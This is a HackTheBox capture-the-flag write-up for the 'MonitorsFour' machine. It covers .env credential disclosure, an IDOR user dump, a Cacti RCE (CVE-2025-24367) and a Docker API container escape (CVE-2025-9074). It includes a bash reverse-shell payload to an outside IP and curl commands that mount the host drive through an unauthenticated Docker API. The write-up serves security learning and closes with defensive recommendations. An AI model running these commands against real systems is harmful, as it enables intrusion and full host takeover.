---
title: "HTB: Monitors Four"
date: 2025-12-15
categories: [HackTheBox, Machines]
tags: [Cacti, HTB, machine, season9]
diffficulty: Easy
layout: post
author: memegamer138
github_username: memegamer138
---

## Executive Summary
MonitorsFour was a medium-difficulty machine featuring a web application with multiple critical vulnerabilities. The attack path began with information disclosure via an exposed `.env` file, leading to database credential discovery. An Insecure Direct Object Reference (IDOR) vulnerability allowed extraction of user password hashes, which when cracked provided access to a vulnerable Cacti instance (v1.2.28). Exploitation of CVE-2025-24367 granted initial foothold within a Docker container, followed by privilege escalation through an unauthenticated Docker API endpoint (CVE-2025-9074) to achieve root access on the host system.

## Tools Used
- **Nmap**: Network reconnaissance and service enumeration
- **ffuf**: Subdomain and directory brute-forcing
- **curl**: Web requests and API interaction testing
- **CrackStation**: Online hash cracking (MD5)
- **Netcat**: Reverse shell listener and network debugging
- **Docker API**: Container management and escape vector

## Reconnaissance
I first performed an nmap scan of the IP.

![alt text](/assets/machines/monitorsFour/image.png)

Nmap scan revealed two open ports:

- **80/tcp**: For HTTP traffic
- **5985/tcp**:  This port is used by Windows Remote Management (WinRM) for HTTP communication, allowing remote management of Windows machines

For now, let's focus on the fact that there is an open port 80 for HTTP traffic.

I tried to visit http://10.10.11.98:80, but I could not connect to it. So I added this to etc/hosts through `sudo nano /etc/hosts`. I added this line to the file:

 `10.10.11.98     monitorsfour.htb`

 Now, on opening http://10.10.11.98:80,

![alt text](/assets/machines/monitorsFour/image-1.png)

Let's do a dirsearch of the page, maybe I can find something interesting.

![alt text](/assets/machines/monitorsFour/image-2.png)

Hmm, a .env giving a 200 OK? I gotta check that. Also note the otehr endpoints like contact, login, and user.

On visiting http://monitorsfour.htb/.env, an automatic download of the .env takes place, and upon opening the file, I see some critical information.

```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

Only problem right now is, while this is great information, I don't really have a place to utilize this..Let's try to do a more in depth scan for subdomains using ffuf. For the wordlist, I used the one from [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt)

I used `ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w subdomains-top1million-5000.txt -fw 3` for header manipulation, and got one result.

![alt text](/assets/machines/monitorsFour/image-3.png)

## Initial Foothold

Now, let's visit http://cacti.monitorsfour.htb/ . Remember we need to add cacti.monitorsfour.htb to etc/hosts. we see a login page

![alt text](/assets/machines/monitorsFour/image-4.png)

Let's now have a look at the other endpoints, /user

![alt text](/assets/machines/monitorsFour/image-5.png)

Missing token.. Let's edit the URL

![alt text](/assets/machines/monitorsFour/image-6.png)

Nice! I found a serious IDOR vulnerability. And using `token=0` gives all the users in the database.

| Username	| MD5 Hash |	Full Name |
|-----------------------|-----------|---------|
|admin      |	56b3**************************** |	Marcus Higgins  |
|mwatson    |	6919**************************** |	Michael Watson  |
| janderson |	2a22**************************** |	Jennifer Anderson  |
| dthompson |	8d4a**************************** |	David Thompson  |

I'm interested in the admin hash, I used an online tool (CrackStation) to crack the hash and managed to get the password. Let's use this in the cacti login page...sigh, I get access denied..

Looking at the login page closely, we see a Version (1.2.28) maybe, we can find some CVEs. Let's google it.

I see many CVEs for cacti, on filtering through them based on version, I found CVE-2025-24367, a Graph Template RCE. On looking for PoCs, I found a repo https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.

Great, let's use this. Following the instructions, I first created a netcat listener. I chose port 12345.

Then, run the exploit

![alt text](/assets/machines/monitorsFour/image-7.png)

This is interesting as admin failed but trying the admin's first name marcus with the password we found worked.

Anyways, we got a reverse shell on the netcat listener! Let's try to check for any files in home/marcus

```bash
www-data@821fbd6a43fa:~/html/cacti$ ls -l /home/marcus
ls -l /home/marcus
total 4
-r-xr-xr-x 1 root root 34 Dec 15 20:43 user.txt
```

`cat` the user.txt and we get the user flag.


## Privilege Escalation
Now, to get the root flag. We can see that we are in a `www-data` container. An `ip route` gives us the default gateway.

```bash
www-data@821fbd6a43fa:~/html/cacti$ ip route
ip route
default via 172.18.0.1 dev eth0 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.3 
```

/etc/resolv.conf shows a nameserver 127.0.0.11 (Docker DNS), which forwards queries to 192.168.65.7. So we know this is a docker container and let us look up CVEs for docker container escape.

In a new shell, let's create a new nc listener to port 60002.

Back to our rev shell, let us utilize this [Docker Escape CVE](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)

```bash
# Create the JSON payload
cat > /tmp/create_container.json << 'EOF'
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.17.220/60002 0>&1"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/host_root"]
  }
}
```

```bash
# 1. Create the malicious container
curl -H 'Content-Type: application/json' \
  -d @/tmp/create_container.json \
  http://192.168.65.7:2375/containers/create \
  -o /tmp/response.json

# 2. Extract the container ID from the response
cat /tmp/response.json

# 3. Use this id to get our reverse shell
curl -X POST http://192.168.65.7:2375/containers/<id>/start
```

We successfully created a reverse shell, only this time, we performed privilege escalation and are now root.

![alt text](/assets/machines/monitorsFour/image-9.png)

To capture the flag, cd to `/host_root/Users/Administrator/Desktop/` and you will see root.txt

---

## Security Recommendations

### For System Administrators
1. **Patch Management**: Update Cacti from v1.2.28 to the latest version to address CVE-2025-24367 and other vulnerabilities.
2. **Network Segmentation**: Place monitoring interfaces (Cacti) on isolated VLANs, separate from database servers.
3. **Environment Files**: Never expose `.env` or configuration files through web servers. Use proper file permissions and web server configurations.
4. **API Security**: Secure Docker API endpoints with authentication and network restrictions.

### For Developers
1. **Input Validation**: Implement proper token validation to prevent IDOR vulnerabilities.
2. **Password Security**: Use stronger hashing algorithms (bcrypt, Argon2) instead of MD5.
3. **Least Privilege**: Run services with minimal necessary permissions (avoid running web apps as root).

### Defense-in-Depth Measures
- Implement Web Application Firewalls (WAF)
- Regular security audits and penetration testing
- Monitor for unusual API access patterns